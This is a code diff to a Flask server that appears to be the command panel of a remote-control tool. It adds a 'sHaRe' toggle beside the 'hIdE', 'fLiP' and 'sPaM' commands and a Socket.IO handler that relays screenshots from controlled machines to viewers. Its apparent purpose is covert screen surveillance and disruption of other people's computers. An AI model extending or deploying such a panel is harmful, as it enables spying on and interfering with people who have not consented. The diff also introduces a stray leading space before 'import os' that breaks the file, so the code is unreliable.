@@ -1,17 +1,19 @@
-import os
+ import os
 from time import time
 from flask import Flask, render_template, request, redirect, jsonify
 from datetime import datetime
 import json
 from zoneinfo import ZoneInfo
+from flask_socketio import SocketIO, emit
 
 app = Flask(__name__)
+socketio = SocketIO(app)
+
 firstReload = True
 timezone = ZoneInfo("Asia/Kolkata")
 startTime = time()
 spam = False
 selected_user = "93"
-prevlog = 0
 STATIC_FOLDER = os.path.join("static")
 if not os.path.exists(STATIC_FOLDER):
     os.makedirs(STATIC_FOLDER)
@@ -37,6 +39,10 @@ with open(state_file,"w") as file:
             "flipToggleState": {
                 "state": "off",
                 "color": "red"
+            },
+            "shareToggleState": {
+            	"state": "off",
+            	"color": "red"
             }
         }
     json.dump(states, file, indent=4)			
@@ -61,6 +67,8 @@ def terminal():
     sc = data1[selected_user]["spamToggleState"]["color"]
     fs = data1[selected_user]["flipToggleState"]["state"]
     fc = data1[selected_user]["flipToggleState"]["color"]
+    shs = data1[selected_user]["shareToggleState"]["state"]
+    shc = data1[selected_user]["shareToggleState"]["color"]
     if not firstReload:
         if time() - startTime <= 2.5:
             state = "Online"
@@ -74,7 +82,7 @@ def terminal():
     else:
         data = {"tasks": []}
     firstReload = False       
-    return render_template("index.html", state=state if state else "Offline", files=files, tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,fs=fs,fc=fc,users=users,selected = selected)
+    return render_template("index.html", state=state if state else "Offline", files=files, tasks=data, color=color,hs=hs,hc=hc,ss=ss,sc=sc,fs=fs,fc=fc,shc=shc,shs=shs,users=users,selected = selected)
 
 @app.route("/edit", methods=["POST", "GET"])
 def edit():
@@ -279,7 +287,7 @@ def toggle():
             with open(state_file, "w") as file:
                 json.dump(data, file, indent=4)
         
-        if cmd == "hIdE" or cmd == "fLiP":
+        if cmd == "hIdE" or cmd == "fLiP" or cmd == "sHaRe":
             with open(os.path.join(STATIC_FOLDER, "message.txt"), "w") as file:
                 file.write(f"{cmd} {state}")
         elif cmd == "sPaM":
@@ -366,7 +374,7 @@ def update_log():
     with open(os.path.join(STATIC_FOLDER,"logs.json"), "r") as file:
         data = json.load(file)
     return jsonify(data)
-@app.route("/err",methods=["GET","POSt"])
+@app.route("/err",methods=["GET","POST"])
 def err():
     if request.method == "POST":
         no = request.form.get("err")
@@ -377,5 +385,9 @@ def clear():
     with open(os.path.join(STATIC_FOLDER,"ip.txt"),"w") as file:
         file.write("")
     return "clear"
+    
+@socketio.on("send_ss") 
+def screenshot(data):
+	socketio.emit("receive_ss",data)
 if __name__ == "__main__":
-    app.run(debug=True)
+    socketio.run(app,debug=True)
